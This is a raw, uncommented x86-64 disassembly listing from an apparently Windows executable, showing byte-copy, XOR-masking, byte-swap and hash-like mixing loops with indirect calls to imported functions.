   140054412:	mov    r9,QWORD PTR [rbp+0xd70]
   140054419:	cmp    rax,r10
   14005441c:	jbe    0x14005443c
   14005441e:	xor    r11d,r11d
   140054421:	cmp    r8,r11
   140054424:	je     0x140054452
   140054426:	lea    rax,[r11+rdi*1]
   14005442a:	xor    edx,edx
   14005442c:	div    r10
   14005442f:	mov    al,BYTE PTR [r9+rdx*1]
   140054433:	mov    BYTE PTR [rcx+r11*1],al
   140054437:	inc    r11
   14005443a:	jmp    0x140054421
   14005443c:	add    r9,rdi
   14005443f:	xor    eax,eax
   140054441:	cmp    r8,rax
   140054444:	je     0x140054452
   140054446:	mov    dl,BYTE PTR [r9+rax*1]
   14005444a:	mov    BYTE PTR [rcx+rax*1],dl
   14005444d:	inc    rax
   140054450:	jmp    0x140054441
   140054452:	mov    rcx,QWORD PTR [rbp+0xd28]
   140054459:	xor    eax,eax
   14005445b:	cmp    rsi,rax
   14005445e:	je     0x14005448c
   140054460:	cmp    rcx,0x3f
   140054464:	ja     0x140059d8e
   14005446a:	mov    edx,eax
   14005446c:	and    edx,0x7
   14005446f:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   140054476:	xor    dl,BYTE PTR [rbp+rax*1+0x7d0]
   14005447d:	inc    rax
   140054480:	mov    BYTE PTR [rbp+rcx*1+0xf80],dl
   140054487:	inc    rcx
   14005448a:	jmp    0x14005445b
   14005448c:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   140054493:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   14005449a:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   1400544a1:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   1400544a8:	xor    eax,eax
   1400544aa:	cmp    rax,0x40
   1400544ae:	je     0x1400544c6
   1400544b0:	mov    ecx,DWORD PTR [rbp+rax*1+0xf80]
   1400544b7:	bswap  ecx
   1400544b9:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   1400544c0:	add    rax,0x4
   1400544c4:	jmp    0x1400544aa
   1400544c6:	movups xmm0,XMMWORD PTR [rbp+0xd88]
   1400544cd:	mov    eax,DWORD PTR [rbp+0xd98]
   1400544d3:	movups XMMWORD PTR [rbp+0x7d0],xmm0
   1400544da:	mov    DWORD PTR [rbp+0x7e0],eax
   1400544e0:	and    DWORD PTR [rbp+0x7e4],0x0
   1400544e7:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   1400544ee:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   1400544f5:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   1400544fc:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   140054503:	lea    rax,[rbp+0x7e8]
   14005450a:	movups XMMWORD PTR [rax+0x30],xmm3
   14005450e:	movups XMMWORD PTR [rax+0x20],xmm2
   140054512:	movups XMMWORD PTR [rax+0x10],xmm1
   140054516:	movups XMMWORD PTR [rax],xmm0
   140054519:	call   0x140064214
   14005451e:	mov    al,BYTE PTR [rip+0x44569]        # 0x140098a8d
   140054524:	cmp    al,0x1
   140054526:	je     0x14005456f
   140054528:	movzx  eax,al
   14005452b:	cmp    eax,0x2
   14005452e:	je     0x140054615
   140054534:	and    DWORD PTR [rbp+0xcc0],0x0
   14005453b:	lea    rcx,[rip+0xfffffffffffacb3e]        # 0x140001080
   140054542:	mov    rdx,QWORD PTR [rbp+0x1150]
   140054549:	push   0x40
   14005454b:	pop    r8
   14005454d:	lea    r9,[rbp+0xcc0]
   140054554:	call   QWORD PTR [rip+0x402ae]        # 0x140094808
   14005455a:	test   eax,eax
   14005455c:	sete   cl
   14005455f:	inc    cl
   140054561:	mov    BYTE PTR [rip+0x44526],cl        # 0x140098a8d
   140054567:	test   eax,eax
   140054569:	je     0x140054615
   14005456f:	mov    al,BYTE PTR [rip+0x44643]        # 0x140098bb8
   140054575:	cmp    al,0x1
   140054577:	je     0x14005459c
   140054579:	movzx  eax,al
   14005457c:	test   eax,eax
   14005457e:	jne    0x140054615
   140054584:	call   0x140065d51
   140054589:	test   rax,rax
   14005458c:	sete   cl
   14005458f:	inc    cl
   140054591:	mov    BYTE PTR [rip+0x44621],cl        # 0x140098bb8
   140054597:	test   rax,rax
   14005459a:	je     0x140054615
   14005459c:	call   0x140064227
   1400545a1:	mov    eax,0xc8c291de
   1400545a6:	xchg   DWORD PTR [rip+0x44534],eax        # 0x140098ae0
   1400545ac:	call   QWORD PTR [rip+0x4009e]        # 0x140094650
   1400545b2:	mov    eax,eax
   1400545b4:	mov    QWORD PTR [rip+0x43a45],rax        # 0x140098000
   1400545bb:	lea    rcx,[rbp+0x7d0]
   1400545c2:	push   0xffffffffffffffff
   1400545c4:	pop    rdx
   1400545c5:	call   0x14002b840
   1400545ca:	xor    eax,eax
   1400545cc:	xchg   DWORD PTR [rip+0x4450e],eax        # 0x140098ae0
   1400545d2:	mov    BYTE PTR [rip+0x444b5],0x0        # 0x140098a8e
   1400545d9:	mov    eax,DWORD PTR [rbp+0x7d0]
   1400545df:	add    DWORD PTR [rbp+0xd88],eax
   1400545e5:	mov    eax,DWORD PTR [rbp+0x7d4]
   1400545eb:	add    DWORD PTR [rbp+0xd8c],eax
   1400545f1:	mov    eax,DWORD PTR [rbp+0x7d8]
   1400545f7:	add    DWORD PTR [rbp+0xd90],eax
   1400545fd:	mov    eax,DWORD PTR [rbp+0x7dc]
   140054603:	add    DWORD PTR [rbp+0xd94],eax
   140054609:	mov    eax,DWORD PTR [rbp+0x7e0]
   14005460f:	add    DWORD PTR [rbp+0xd98],eax
   140054615:	mov    BYTE PTR [rip+0x44470],0x0        # 0x140098a8c
   14005461c:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   140054623:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   14005462a:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   140054631:	xor    eax,eax
   140054633:	cmp    rax,0x14
   140054637:	je     0x14005464f
   140054639:	mov    ecx,DWORD PTR [rbp+rax*1+0xd88]
   140054640:	bswap  ecx
   140054642:	mov    DWORD PTR [rbp+rax*1+0x7d0],ecx
   140054649:	add    rax,0x4
   14005464d:	jmp    0x140054633
   14005464f:	mov    r8,QWORD PTR [rbp+0xd20]
   140054656:	mov    eax,r13d
   140054659:	shr    eax,0x3
   14005465c:	and    eax,0x1f
   14005465f:	lea    rcx,[rax+rbp*1]
   140054663:	add    rcx,0x7d0
   14005466a:	xor    r9d,r9d
   14005466d:	xor    edx,edx
   14005466f:	xor    eax,eax
   140054671:	cmp    r9,0x10
   140054675:	je     0x140054690
   140054677:	shld   rax,rdx,0x8
   14005467c:	mov    r10,rdx
   14005467f:	shl    r10,0x8
   140054683:	movzx  edx,BYTE PTR [rcx+r9*1]
   140054688:	inc    r9
   14005468b:	or     rdx,r10
   14005468e:	jmp    0x140054671
   140054690:	push   0xffffffffffffffff
   140054692:	pop    r9
   140054694:	mov    r10,r9
   140054697:	mov    ecx,r8d
   14005469a:	shl    r10,cl
   14005469d:	cmp    r8,0x40
   1400546a1:	not    r10
   1400546a4:	cmovae r10,r9
   1400546a8:	and    r13d,0x7
   1400546ac:	lea    ecx,[r8+r13*1]
   1400546b0:	neg    cl
   1400546b2:	shrd   rdx,rax,cl
   1400546b6:	shr    rax,cl
   1400546b9:	test   cl,0x40
   1400546bc:	cmove  rax,rdx
   1400546c0:	and    rax,r10
   1400546c3:	mov    rsi,QWORD PTR [rbp+0xd60]
   1400546ca:	add    r8,0x7
   1400546ce:	bswap  rax
   1400546d1:	shr    r8,0x3
   1400546d5:	mov    QWORD PTR [rbp+0x1060],rax
   1400546dc:	mov    r9,rsi
   1400546df:	imul   r9,r8
   1400546e3:	push   0x8
   1400546e5:	pop    rcx
   1400546e6:	sub    rcx,r8
   1400546e9:	dec    r8
   1400546ec:	mov    rax,QWORD PTR [rbp+0x1168]
   1400546f3:	lea    r11,[rax+r9*1]
   1400546f7:	mov    rax,r9
   1400546fa:	xor    edx,edx
   1400546fc:	push   0x14
   1400546fe:	pop    rdi
   1400546ff:	div    rdi
   140054702:	cmp    rcx,0x8
   140054706:	je     0x14005472c
   140054708:	cmp    r8,0x7
   14005470c:	ja     0x140059d80
   140054712:	imul   rax,rax,0xffffffffffffffec
   140054716:	mov    al,BYTE PTR [r11+rax*1]
   14005471a:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   140054721:	inc    rcx
   140054724:	inc    r11
   140054727:	inc    r9
   14005472a:	jmp    0x1400546f7
   14005472c:	mov    r11,QWORD PTR [rbp+0x1060]
   140054733:	bswap  r11
   140054736:	and    r11,r10
   140054739:	inc    rsi
   14005473c:	mov    QWORD PTR [rbp+0xd60],rsi
   140054743:	mov    r9,QWORD PTR [rbp+0xdd0]
   14005474a:	mov    rax,QWORD PTR [rbp+0xdc0]
   140054751:	mov    r8,QWORD PTR [rbp+0xdc8]
   140054758:	mov    rdx,r9
   14005475b:	sub    rdx,r8
   14005475e:	sub    rdx,rax
   140054761:	mov    rcx,QWORD PTR [rbp+0xd20]
   140054768:	cmp    rdx,rcx
   14005476b:	cmovae rdx,rcx
   14005476f:	cmp    rdx,0x1
   140054773:	adc    rdx,0x0
   140054777:	mov    r10d,ecx
   14005477a:	sub    r10d,edx
   14005477d:	and    r10b,0x3f
   140054781:	cmp    rcx,rdx
   140054784:	movzx  ecx,r10b
   140054788:	mov    r10d,0x0
   14005478e:	cmovbe ecx,r10d
   140054792:	shr    r11,cl
   140054795:	mov    r10,QWORD PTR [rbp+0xdb0]
   14005479c:	mov    rsi,QWORD PTR [rbp+0xdb8]
   1400547a3:	mov    ecx,edx
   1400547a5:	shld   rsi,r10,cl
   1400547a9:	shl    r10,cl
   1400547ac:	test   dl,0x40
   1400547af:	cmovne rsi,r10
   1400547b3:	mov    ecx,0x0
   1400547b8:	cmove  rcx,r10
   1400547bc:	or     rcx,r11
   1400547bf:	mov    QWORD PTR [rbp+0xdb8],rsi
   1400547c6:	mov    QWORD PTR [rbp+0xdb0],rcx
   1400547cd:	add    rax,rdx
   1400547d0:	mov    QWORD PTR [rbp+0xdc0],rax
   1400547d7:	jmp    0x14005427f
   1400547dc:	add    rax,0xfffffffffffffff8
   1400547e0:	mov    QWORD PTR [rbp+0xdc0],rax
   1400547e7:	mov    r9,QWORD PTR [rbp+0xdb8]
   1400547ee:	mov    r10,r9
   1400547f1:	mov    ecx,eax
   1400547f3:	shr    r10,cl
   1400547f6:	mov    r11,QWORD PTR [rbp+0xdb0]
   1400547fd:	mov    rdx,r11
   140054800:	shrd   rdx,r9,cl
   140054804:	push   0xffffffffffffffff
   140054806:	pop    rdi
   140054807:	mov    rsi,rdi
   14005480a:	shl    rsi,cl
   14005480d:	test   al,0x40
   14005480f:	cmovne rdx,r10
   140054813:	mov    ecx,0x0
   140054818:	cmove  rcx,rsi
   14005481c:	cmove  rsi,rdi
   140054820:	not    rsi
   140054823:	not    rcx
   140054826:	and    rcx,r11
   140054829:	and    rsi,r9
   14005482c:	test   rax,rax
   14005482f:	cmove  rsi,rax
   140054833:	cmove  rcx,rax
   140054837:	mov    QWORD PTR [rbp+0xdb0],rcx
   14005483e:	mov    QWORD PTR [rbp+0xdb8],rsi
   140054845:	add    r8,0x8
   140054849:	mov    QWORD PTR [rbp+0xdc8],r8
   140054850:	inc    r14
   140054853:	lea    rcx,[rbp+0x710]
   14005485a:	call   0x14003c141
   14005485f:	jmp    0x140054250
   140054864:	mov    rbx,QWORD PTR [rbp+0x710]
   14005486b:	mov    r13,QWORD PTR [rbp+0x718]
   140054872:	mov    rsi,QWORD PTR [rbp+0x720]
   140054879:	add    rsi,r13
   14005487c:	mov    QWORD PTR [rbp+0x7d0],r13
   140054883:	mov    QWORD PTR [rbp+0x7d8],rsi
   14005488a:	mov    QWORD PTR [rbp+0x7e0],0x8
   140054895:	and    QWORD PTR [rbp+0x7e8],0x0
   14005489d:	xor    edi,edi
   14005489f:	lea    rcx,[rbp+0x7d0]
   1400548a6:	call   0x14003ba96
   1400548ab:	test   rdx,rdx
   1400548ae:	je     0x1400548c0
   1400548b0:	movzx  edx,BYTE PTR [rdx]
   1400548b3:	shl    eax,0x3
   1400548b6:	mov    ecx,eax
   1400548b8:	shl    rdx,cl
   1400548bb:	or     rdi,rdx
   1400548be:	jmp    0x14005489f
   1400548c0:	mov    r9,rdi
   1400548c3:	movabs rax,0x4f1bbcdca8279931
   1400548cd:	imul   r9,rax
   1400548d1:	rol    r9,0x11
   1400548d5:	xor    r9,rdi
   1400548d8:	mov    r10,r9
   1400548db:	movabs rax,0x6b1f30a8d4c752e9
   1400548e5:	xor    r10,rax
   1400548e8:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   1400548ef:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   1400548f6:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   1400548fd:	movaps XMMWORD PTR [rbp+0x800],xmm7
   140054904:	movaps XMMWORD PTR [rbp+0x810],xmm7
   14005490b:	movaps XMMWORD PTR [rbp+0x820],xmm7
   140054912:	movaps XMMWORD PTR [rbp+0x830],xmm7
   140054919:	movaps XMMWORD PTR [rbp+0x840],xmm7
   140054920:	movabs rax,0x1f91b0e3369d229e
   14005492a:	xor    r9,rax
   14005492d:	mov    r11,r10
   140054930:	or     r11,0x1
   140054934:	rol    r11,0x15
   140054938:	lea    rdi,[r12+0x1]
   14005493d:	xor    r14d,r14d
   140054940:	cmp    r14,0x10
   140054944:	je     0x140054a10
   14005494a:	mov    rax,r14
   14005494d:	movabs rcx,0x32a27dbe0b6bcf37
   140054957:	imul   rax,rcx
   14005495b:	rol    rax,0x20
   14005495f:	xor    rax,r10
   140054962:	mov    rcx,r11
   140054965:	push   0x7
   140054967:	pop    rdx
   140054968:	mov    r8,r9
   14005496b:	sub    edx,0x1
   14005496e:	jb     0x1400549a4
   140054970:	mov    r15,rcx
   140054973:	xor    r15,rax
   140054976:	add    r15,r8
   140054979:	rol    r15,0x28
   14005497d:	add    rax,r15
   140054980:	rol    rax,0xf
   140054984:	mov    r8,rax
   140054987:	shr    r8,0x1d
   14005498b:	xor    rax,r8
   14005498e:	movabs r8,0x79ca1cd2f36bd757
   140054998:	imul   r15,r8
   14005499c:	add    rcx,r11
   14005499f:	mov    r8,r15
   1400549a2:	jmp    0x14005496b
   1400549a4:	lea    rcx,[r14*4+0x4]
   1400549ac:	xor    r15d,r15d
   1400549af:	cmp    rcx,QWORD PTR [rbp+0x1148]
   1400549b6:	ja     0x1400549cb
   1400549b8:	lea    rcx,[r14*4+0x0]
   1400549c0:	mov    rdx,QWORD PTR [rbp+0x1160]
   1400549c7:	mov    r15d,DWORD PTR [rdx+rcx*1]
   1400549cb:	xor    r8,rax
   1400549ce:	mov    rax,r8
   1400549d1:	shr    rax,0x18
   1400549d5:	xor    edx,edx
   1400549d7:	push   0x1f
   1400549d9:	pop    rcx
   1400549da:	div    ecx
   1400549dc:	lea    ecx,[rdx+0x1]
   1400549df:	ror    r15d,cl
   1400549e2:	mov    rax,r8
   1400549e5:	shr    rax,0x10
   1400549e9:	mov    rcx,r8
   1400549ec:	shr    rcx,0x28
   1400549f0:	xor    ecx,eax
   1400549f2:	xor    r8d,ecx
   1400549f5:	xor    r8d,r15d
   1400549f8:	mov    rax,r8
   1400549fb:	xor    edx,edx
   1400549fd:	div    rdi
   140054a00:	mov    QWORD PTR [rbp+r14*8+0x7d0],rdx
   140054a08:	inc    r14
   140054a0b:	jmp    0x140054940
   140054a10:	and    QWORD PTR [rbp+0xf80],0x0
   140054a18:	mov    QWORD PTR [rbp+0x1060],r13
   140054a1f:	mov    QWORD PTR [rbp+0x1068],rsi
   140054a26:	mov    QWORD PTR [rbp+0x1070],0x8
   140054a31:	and    QWORD PTR [rbp+0x1078],0x0
   140054a39:	lea    rcx,[rbp+0x1060]
   140054a40:	call   0x14003ba96
   140054a45:	test   rdx,rdx
   140054a48:	je     0x140054a5f
   140054a4a:	cmp    rax,0x7
   140054a4e:	ja     0x14004a57a
   140054a54:	mov    cl,BYTE PTR [rdx]
   140054a56:	mov    BYTE PTR [rbp+rax*1+0xf80],cl
   140054a5d:	jmp    0x140054a39
   140054a5f:	mov    ecx,0x80
   140054a64:	lea    rdi,[rbp+0x1060]
   140054a6b:	lea    rsi,[rbp+0x7d0]
   140054a72:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   140054a74:	mov    rsi,QWORD PTR [rbp+0xf80]
   140054a7b:	mov    rcx,rbx
   140054a7e:	mov    rdx,r13
   140054a81:	call   0x14006f7f7
   140054a86:	mov    rcx,QWORD PTR [rbp+0xf70]
   140054a8d:	mov    rdx,QWORD PTR [rbp+0x1160]
   140054a94:	call   0x14006f7f7
   140054a99:	mov    QWORD PTR [rbp+0x680],rsi
   140054aa0:	mov    rax,QWORD PTR [rbp+0xd58]
   140054aa7:	sub    QWORD PTR [rbp+0x1138],rax
   140054aae:	jb     0x14005a158
   140054ab4:	mov    ecx,DWORD PTR [rbp+0x6c8]
   140054aba:	mov    DWORD PTR [rbp+0xf80],ecx
   140054ac0:	mov    ecx,DWORD PTR [rbp+0x1134]
   140054ac6:	mov    DWORD PTR [rbp+0xf84],ecx
   140054acc:	mov    ecx,DWORD PTR [rbp+0x6c0]
   140054ad2:	mov    DWORD PTR [rbp+0xf88],ecx
   140054ad8:	mov    ecx,DWORD PTR [rbp+0xcb8]
   140054ade:	mov    DWORD PTR [rbp+0xf8c],ecx
   140054ae4:	mov    ecx,DWORD PTR [rbp+0x5f0]
   140054aea:	mov    DWORD PTR [rbp+0xf90],ecx
   140054af0:	je     0x14005a158
   140054af6:	mov    rdi,QWORD PTR [rbp+0x1180]
   140054afd:	add    rdi,rax
   140054b00:	mov    rcx,QWORD PTR [rbp+0x1158]
   140054b07:	lea    rdx,[rbp+0xf80]
   140054b0e:	call   0x14003ad8d
   140054b13:	mov    eax,DWORD PTR [rbp+0xf90]
   140054b19:	lea    rdx,[rbp+0x7d8]
   140054b20:	mov    DWORD PTR [rdx+0x80],eax
   140054b26:	movups xmm0,XMMWORD PTR [rbp+0xf80]
   140054b2d:	movups XMMWORD PTR [rdx+0x70],xmm0
   140054b31:	mov    rax,QWORD PTR [rbp+0x660]
   140054b38:	lea    rcx,[rbp+0x7e8]
   140054b3f:	mov    QWORD PTR [rcx+0x20],rax
   140054b43:	mov    r9,QWORD PTR [rbp+0x6a8]
   140054b4a:	shr    r9,0x3d
   140054b4e:	mov    r8,QWORD PTR [rbp+0x7a0]
   140054b55:	lea    rax,[r8*8+0x0]
   140054b5d:	neg    r9
   140054b60:	mov    esi,0x0
   140054b65:	sbb    rsi,rsi
   140054b68:	or     rsi,rax
   140054b6b:	movaps xmm0,XMMWORD PTR [rbp+0x640]
   140054b72:	movaps xmm1,XMMWORD PTR [rbp+0x650]
   140054b79:	movups XMMWORD PTR [rcx+0x10],xmm1
   140054b7d:	movups XMMWORD PTR [rcx],xmm0
   140054b80:	mov    QWORD PTR [rbp+0x1180],rdi
   140054b87:	mov    QWORD PTR [rbp+0x7d0],rdi
   140054b8e:	mov    rcx,QWORD PTR [rbp+0x1138]
   140054b95:	mov    QWORD PTR [rbp+0x7d8],rcx
   140054b9c:	mov    rax,QWORD PTR [rbp+0x1178]
   140054ba3:	mov    QWORD PTR [rbp+0x7e0],rax
   140054baa:	mov    QWORD PTR [rbp+0x810],r8
   140054bb1:	movups XMMWORD PTR [rdx+0x40],xmm7
   140054bb5:	mov    QWORD PTR [rbp+0x828],rcx
   140054bbc:	mov    rax,QWORD PTR [rbp+0x608]
   140054bc3:	mov    QWORD PTR [rbp+0x830],rax
   140054bca:	mov    rax,QWORD PTR [rbp+0x6d8]
   140054bd1:	mov    QWORD PTR [rbp+0x838],rax
   140054bd8:	mov    rax,QWORD PTR [rbp+0x3f0]
   140054bdf:	mov    QWORD PTR [rbp+0x840],rax
   140054be6:	mov    rax,QWORD PTR [rbp+0xcb0]
   140054bed:	movaps XMMWORD PTR [rax+0x10],xmm7
   140054bf1:	movaps XMMWORD PTR [rax],xmm7
   140054bf4:	mov    QWORD PTR [rbp+0x890],rsi
   140054bfb:	lea    rax,[rbp+0x680]
   140054c02:	mov    QWORD PTR [rbp+0xf80],rax
   140054c09:	lea    rax,[rbp+0x688]
   140054c10:	mov    QWORD PTR [rbp+0xf88],rax
   140054c17:	mov    QWORD PTR [rbp+0xf90],0x8
   140054c22:	and    QWORD PTR [rbp+0xf98],0x0
   140054c2a:	xor    edi,edi
   140054c2c:	lea    rcx,[rbp+0xf80]
   140054c33:	call   0x14003ba96
   140054c38:	test   rdx,rdx
   140054c3b:	je     0x140054c4d
   140054c3d:	movzx  edx,BYTE PTR [rdx]
   140054c40:	shl    eax,0x3
   140054c43:	mov    ecx,eax
   140054c45:	shl    rdx,cl
   140054c48:	or     rdi,rdx
   140054c4b:	jmp    0x140054c2c
   140054c4d:	mov    rax,rdi
   140054c50:	movabs rcx,0x4f1bbcdca8279931
   140054c5a:	imul   rax,rcx
   140054c5e:	rol    rax,0x11
   140054c62:	xor    rax,rdi
   140054c65:	mov    rdx,rax
   140054c68:	movabs rcx,0x6b1f30a8d4c752e9
   140054c72:	xor    rdx,rcx
   140054c75:	movabs rcx,0x1f91b0e3369d229e
   140054c7f:	xor    rax,rcx
   140054c82:	mov    rcx,rdx
   140054c85:	xor    rcx,QWORD PTR [rbp+0x1d8]
   140054c8c:	or     rdx,0x1
   140054c90:	rol    rdx,0x15
   140054c94:	mov    r8,rdx
   140054c97:	push   0x7
   140054c99:	pop    r9
   140054c9b:	sub    r9d,0x1
   140054c9f:	jb     0x140054cd5
   140054ca1:	mov    r10,r8
   140054ca4:	xor    r10,rcx
   140054ca7:	add    r10,rax
   140054caa:	rol    r10,0x28
   140054cae:	add    rcx,r10
   140054cb1:	rol    rcx,0xf
   140054cb5:	mov    rax,rcx
   140054cb8:	shr    rax,0x1d
   140054cbc:	xor    rcx,rax
   140054cbf:	movabs rax,0x79ca1cd2f36bd757
   140054cc9:	imul   r10,rax
   140054ccd:	add    r8,rdx
   140054cd0:	mov    rax,r10
   140054cd3:	jmp    0x140054c9b
   140054cd5:	mov    r8,r12
   140054cd8:	mov    rdx,QWORD PTR [rbp+0x1058]
   140054cdf:	sub    r8,QWORD PTR [rbp+rdx*8+0x1060]
   140054ce7:	inc    r8
   140054cea:	je     0x14005a1ee
   140054cf0:	xor    rax,rcx
   140054cf3:	shr    rax,0x20
   140054cf7:	imul   r12,QWORD PTR [rbp+0x1058]
   140054cff:	xor    edx,edx
   140054d01:	div    r8
   140054d04:	mov    rcx,rdx
   140054d07:	add    rcx,r12
   140054d0a:	mov    eax,0x10000
   140054d0f:	cmp    rcx,rax
   140054d12:	mov    edx,0x10000
   140054d17:	mov    QWORD PTR [rbp+0x1148],rcx
   140054d1e:	cmovb  rdx,rcx
   140054d22:	lea    rcx,[rbp+0x610]
   140054d29:	call   0x14003c111
   140054d2e:	xor    ebx,ebx
   140054d30:	xor    r12d,r12d
   140054d33:	xor    r15d,r15d
   140054d36:	xor    edi,edi
   140054d38:	xor    r14d,r14d
   140054d3b:	xor    r13d,r13d
   140054d3e:	cmp    r13,QWORD PTR [rbp+0x1148]
   140054d45:	jae    0x14005533a
   140054d4b:	lea    rax,[r14+0x8]
   140054d4f:	cmp    rax,rsi
   140054d52:	jbe    0x140054d5b
   140054d54:	xor    edx,edx
   140054d56:	jmp    0x140055326
   140054d5b:	cmp    rdi,0x8
   140054d5f:	jae    0x1400552b4
   140054d65:	cmp    rbx,QWORD PTR [rbp+0x828]
   140054d6c:	jae    0x140054db2
   140054d6e:	mov    rax,QWORD PTR [rbp+0x7d8]
   140054d75:	mov    rcx,QWORD PTR [rbp+0x818]
   140054d7c:	cmp    rcx,rax
   140054d7f:	jae    0x140054db2
   140054d81:	mov    rdx,QWORD PTR [rbp+0x1180]
   140054d88:	movzx  esi,BYTE PTR [rdx+rcx*1]
   140054d8c:	and    esi,0x7f
   140054d8f:	inc    rcx
   140054d92:	cmp    rcx,rax
   140054d95:	jae    0x140054dbc
   140054d97:	mov    rdx,QWORD PTR [rbp+0x1180]
   140054d9e:	movzx  edx,BYTE PTR [rdx+rcx*1]
   140054da2:	test   dl,dl
   140054da4:	jns    0x140054db9
   140054da6:	shl    rsi,0x7
   140054daa:	and    edx,0x7f
   140054dad:	or     rsi,rdx
   140054db0:	jmp    0x140054d8f
   140054db2:	xor    edx,edx
   140054db4:	jmp    0x14005523f
   140054db9:	mov    rax,rcx
   140054dbc:	mov    QWORD PTR [rbp+0x818],rax
   140054dc3:	mov    rax,rsi
   140054dc6:	shr    rax,0x8
   140054dca:	mov    rdi,rsi
   140054dcd:	shr    rdi,0x28
   140054dd1:	movaps XMMWORD PTR [rbp+0xcf0],xmm7
   140054dd8:	movaps XMMWORD PTR [rbp+0xce0],xmm7
   140054ddf:	movaps XMMWORD PTR [rbp+0xcd0],xmm7
   140054de6:	movaps XMMWORD PTR [rbp+0xcc0],xmm7
   140054ded:	mov    DWORD PTR [rbp+0xf80],eax
   140054df3:	lea    rax,[rip+0x3325e]        # 0x140088058
   140054dfa:	mov    QWORD PTR [rsp+0x20],rax
   140054dff:	lea    rcx,[rbp+0xcc0]
   140054e06:	push   0x4
   140054e08:	pop    rdx
   140054e09:	lea    r8,[rbp+0xf80]
   140054e10:	mov    r9,rdx
   140054e13:	call   0x1400638fe
   140054e18:	mov    BYTE PTR [rbp+0xcc4],dil
   140054e1f:	mov    rdi,QWORD PTR [rbp+0x7f0]
   140054e26:	cmp    QWORD PTR [rbp+0x838],rdi
   140054e2d:	jbe    0x140054f59
   140054e33:	mov    r9,QWORD PTR [rbp+0x7f8]
   140054e3a:	cmp    r9,0x4
   140054e3e:	ja     0x140059d9c
   140054e44:	mov    rcx,QWORD PTR [rbp+0x800]
   140054e4b:	cmp    rcx,0x5
   140054e4f:	jae    0x140059dae
   140054e55:	mov    r14,QWORD PTR [rbp+0x838]
   140054e5c:	cmp    r14,rdi
   140054e5f:	je     0x140059dbc
   140054e65:	mov    r8,r14
   140054e68:	mov    eax,DWORD PTR [rbp+rcx*4+0x848]
   140054e6f:	mov    cl,BYTE PTR [rbp+0x808]
   140054e75:	rol    eax,cl
   140054e77:	sub    r8,rdi
   140054e7a:	xor    eax,DWORD PTR [rbp+r9*4+0x848]
   140054e82:	xor    edx,edx
   140054e84:	div    r8
   140054e87:	mov    rbx,rdx
   140054e8a:	mov    rax,QWORD PTR [rbp+0x840]
   140054e91:	mov    QWORD PTR [rbp+0x710],rax
   140054e98:	cmp    rdi,0x40
   140054e9c:	push   0x40
   140054e9e:	pop    rax
   140054e9f:	cmovae rdi,rax
   140054ea3:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   140054eaa:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   140054eb1:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   140054eb8:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   140054ebf:	lea    rcx,[rbp+0xf80]
   140054ec6:	mov    rdx,rdi
   140054ec9:	call   0x14003c0b8
   140054ece:	test   r14,r14
   140054ed1:	je     0x140054f1f
   140054ed3:	mov    rcx,rax
   140054ed6:	mov    r8,rdx
   140054ed9:	mov    rax,rdx
   140054edc:	add    rax,rbx
   140054edf:	mov    r9,QWORD PTR [rbp+0x830]
   140054ee6:	cmp    rax,r14
   140054ee9:	jbe    0x140054f09
   140054eeb:	xor    r10d,r10d
   140054eee:	cmp    r8,r10
   140054ef1:	je     0x140054f1f
   140054ef3:	lea    rax,[r10+rbx*1]
   140054ef7:	xor    edx,edx
   140054ef9:	div    r14
   140054efc:	mov    al,BYTE PTR [r9+rdx*1]
   140054f00:	mov    BYTE PTR [rcx+r10*1],al
   140054f04:	inc    r10
   140054f07:	jmp    0x140054eee
   140054f09:	add    r9,rbx
   140054f0c:	xor    eax,eax
   140054f0e:	cmp    r8,rax
   140054f11:	je     0x140054f1f
   140054f13:	mov    dl,BYTE PTR [r9+rax*1]
   140054f17:	mov    BYTE PTR [rcx+rax*1],dl
   140054f1a:	inc    rax
   140054f1d:	jmp    0x140054f0e
   140054f1f:	mov    rcx,QWORD PTR [rbp+0x7e8]
   140054f26:	xor    eax,eax
   140054f28:	cmp    rdi,rax
   140054f2b:	je     0x140054f59
   140054f2d:	cmp    rcx,0x3f
   140054f31:	ja     0x140059d8e
   140054f37:	mov    edx,eax
   140054f39:	and    edx,0x7
   140054f3c:	mov    dl,BYTE PTR [rbp+rdx*1+0x710]
   140054f43:	xor    dl,BYTE PTR [rbp+rax*1+0xf80]
   140054f4a:	inc    rax
   140054f4d:	mov    BYTE PTR [rbp+rcx*1+0xcc0],dl
   140054f54:	inc    rcx
   140054f57:	jmp    0x140054f28
   140054f59:	movaps XMMWORD PTR [rbp+0x740],xmm7
   140054f60:	movaps XMMWORD PTR [rbp+0x730],xmm7
   140054f67:	movaps XMMWORD PTR [rbp+0x720],xmm7
   140054f6e:	movaps XMMWORD PTR [rbp+0x710],xmm7
   140054f75:	xor    eax,eax
   140054f77:	cmp    rax,0x40
   140054f7b:	je     0x140054f93
   140054f7d:	mov    ecx,DWORD PTR [rbp+rax*1+0xcc0]
   140054f84:	bswap  ecx
   140054f86:	mov    DWORD PTR [rbp+rax*1+0x710],ecx
   140054f8d:	add    rax,0x4
   140054f91:	jmp    0x140054f77
   140054f93:	movups xmm0,XMMWORD PTR [rbp+0x848]
   140054f9a:	mov    eax,DWORD PTR [rbp+0x858]
   140054fa0:	movups XMMWORD PTR [rbp+0xf80],xmm0
   140054fa7:	mov    DWORD PTR [rbp+0xf90],eax
   140054fad:	and    DWORD PTR [rbp+0xf94],0x0
   140054fb4:	movaps xmm0,XMMWORD PTR [rbp+0x710]
